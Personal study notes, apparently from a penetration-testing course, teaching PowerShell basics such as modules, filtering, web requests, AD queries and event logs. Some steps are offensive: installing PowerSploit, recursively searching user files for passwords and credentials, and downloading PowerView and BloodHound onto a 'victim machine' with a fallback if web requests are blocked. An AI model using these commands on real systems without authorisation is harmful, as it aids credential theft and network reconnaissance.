# 0b - Learning Powershell

Getting available modules on the system

```powershell
Get-Module -ListAvailable
```

Getting only loaded modules on the system

```powershell
Get-Module
```

Loading Module on the system

```powershell
Import-Module PowershellGet
```

Getting available functions provided by modules

```powershell
Get-Command -module <Module_Name>
```

Output:

```powershell
PS C:\Users\George> Get-command -module powershellget

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Function        Find-Command                                       2.2.5      powershellget
Function        Find-DscResource                                   2.2.5      powershellget
Function        Find-Module                                        2.2.5      powershellget
Function        Find-RoleCapability                                2.2.5      powershellget
Function        Find-Script                                        2.2.5      powershellget
Function        Get-CredsFromCredentialProvider                    2.2.5      powershellget
Function        Get-InstalledModule                                2.2.5      powershellget
Function        Get-InstalledScript                                2.2.5      powershellget
Function        Get-PSRepository                                   2.2.5      powershellget
Function        Install-Module                                     2.2.5      powershellget
Function        Install-Script                                     2.2.5      powershellget
Function        New-ScriptFileInfo                                 2.2.5      powershellget
Function        Publish-Module                                     2.2.5      powershellget
Function        Publish-Script                                     2.2.5      powershellget
Function        Register-PSRepository                              2.2.5      powershellget
Function        Save-Module                                        2.2.5      powershellget
Function        Save-Script                                        2.2.5      powershellget
Function        Set-PSRepository                                   2.2.5      powershellget
Function        Test-ScriptFileInfo                                2.2.5      powershellget
Function        Uninstall-Module                                   2.2.5      powershellget
Function        Uninstall-Script                                   2.2.5      powershellget
Function        Unregister-PSRepository                            2.2.5      powershellget
Function        Update-Module                                      2.2.5      powershellget
Function        Update-ModuleManifest                              2.2.5      powershellget
Function        Update-Script                                      2.2.5      powershellget
Function        Update-ScriptFileInfo                              2.2.5      powershellget

```

Finding and installing modules from \[powershell gallery]\([PowerShell Gallery | Home](https://www.powershellgallery.com/))

```powershell
Find-Module -Name admintoolbox | Install-Module
```

Installing module from local files

```powershell
    Directory: C:\Users\George\Desktop\PowerSploit

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----            2/3/2025 10:42 AM                AntivirusBypass
d----            2/3/2025 10:42 AM                CodeExecution
d----            2/3/2025 10:42 AM                docs
d----            2/3/2025 10:42 AM                Exfiltration
d----            2/3/2025 10:42 AM                Mayhem
d----            2/3/2025 10:42 AM                Persistence
d----            2/3/2025 10:42 AM                Privesc
d----            2/3/2025 10:42 AM                Recon
d----            2/3/2025 10:42 AM                ScriptModification
d----            2/3/2025 10:42 AM                Tests
-a---            2/3/2025 10:42 AM           2852 .gitignore
-a---            2/3/2025 10:42 AM           1590 LICENSE
-a---            2/3/2025 10:42 AM           8652 mkdocs.yml
-a---            2/3/2025 10:42 AM           5452 PowerSploit.psd1
-a---            2/3/2025 10:42 AM            150 PowerSploit.psm1
-a---            2/3/2025 10:42 AM          15855 PowerSploit.pssproj
-a---            2/3/2025 10:42 AM            993 PowerSploit.sln
-a---            2/3/2025 10:42 AM          10491 README.md
```

```powershell
Install-Module .\Powersploit.psd1
```

Getting help for commands with examples

```powershell
Get-Help <PS-module> -Examples
```

Creating new Directory or File

```powershell
New-Item -Name "Folder" -Type Directory
New-Item -Name "file.txt" -Type File
```

Adding contents to a file

```powershell
Add-Content file.txt "First line
Second Line
Third line"
```

Renaming folders/files at once

```powershell
Get-ChildItem -path *.txt | Rename-Item -NewName {$_.name -replace ".txt", ".md"}
```

after the dot in `$_.` comes the property name like `Name`, `Status` etc.

Filtering PowerShell object output. In this example I'm getting all local users, displaying their name, last login date, if password is required or not and sorting them alphabetically with their names

```powershell
Get-LocalUser * | Select-Object -Property Name,LastLogon,PasswordRequired,Enabled | Sort-Object Name
```

all of the above is possible because PowerShell is made up of objects.

Getting service based on string search

```powershell
Get-Service | where DisplayName -like "*defend*" | select-object -Property *
```

* like
* contains
* equal
* match
* not

The results of above command show every service associated with Windows Defender and their properties.

Getting count of unique items of whatever.

```powershell
Get-Process | sort |  uniq | Measure-Object | select -Property Count | fl
```

`&&` Pipeline operator ensures that if current operation succeeds it then runs next command `||` Pipeline operator ensures that if current operation doesn't run the next one will run `|` Pipeline operator runs whether or not previous command fails

Searching for specific file in a directory

```powershell
Get-ChildItem -Path D:\ -File -Recurse | where {$_.name -like "*.txt"}
```

searching for sensitive strings in files

```powershell
Get-ChildItem -Path C:\Users\ -Filter "*.txt" -Recurse -File | sls "Password","credential","key"
```

Get Properties and methods of an object

```powershell
Get-LocalUser administrator | get-member
```

Getting structured contents of a website and what can be retrieved from the website

```powershell
Invoke-WebRequest -Uri "https://www.hackthebox.com/" -Method GET | Get-Member


   TypeName: Microsoft.PowerShell.Commands.BasicHtmlWebResponseObject

Name              MemberType Definition
----              ---------- ----------
Equals            Method     bool Equals(System.Object obj)
GetHashCode       Method     int GetHashCode()
GetType           Method     type GetType()
ToString          Method     string ToString()
BaseResponse      Property   System.Net.Http.HttpResponseMessage BaseResponse {get;set;}
Content           Property   string Content {get;}
Encoding          Property   System.Text.Encoding Encoding {get;}
Headers           Property   System.Collections.Generic.Dictionary[string,System.Collections.Generic.IEnumerable[strin…
Images            Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Images {get;}
InputFields       Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection InputFields {get;}
Links             Property   Microsoft.PowerShell.Commands.WebCmdletElementCollection Links {get;}
RawContent        Property   string RawContent {get;set;}
RawContentLength  Property   long RawContentLength {get;}
RawContentStream  Property   System.IO.MemoryStream RawContentStream {get;set;}
RelationLink      Property   System.Collections.Generic.Dictionary[string,string] RelationLink {get;}
StatusCode        Property   int StatusCode {get;}
StatusDescription Property   string StatusDescription {get;}
```

Filtering element details from website

```powershell
Invoke-WebRequest -Uri "https://www.hackthebox.com/" -Method GET | fl StatusCode
```

Downloading a file

```powershell
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" -OutFile "C:\PowerView.ps1"
```

&#x20;If we already had `PowerView.ps1` stored on our `attack host` we could use a simple python web server to host PowerView.ps1 and download it from the target.

In case `Invoke-WebRequest` method is restricted on victim machine

```powershell
(New-Object Net.WebClient).DownloadFile("https://github.com/BloodHoundAD/BloodHound/releases/download/4.2.0/BloodHound-win32-x64.zip", "Bloodhound.zip")
```

Getting filtered AD users

```powershell
Get-ADUser -Filter 'Name -like "*SvcAccount"' | Format-Table Name,SamAccountName -A
```

Get all users in a domain

```powershell
Get-ADUser -Filter * -SearchBase "OU=Finance,OU=UserAccounts,DC=FABRIKAM,DC=COM"
```

Filter failed logon attempts using `Get-EventLog`

```powershell
Get-EventLog Security | where {$_.EventID -eq "4625"} | select -ExpandProperty Message | findstr "Ac
count Name" | sort
```
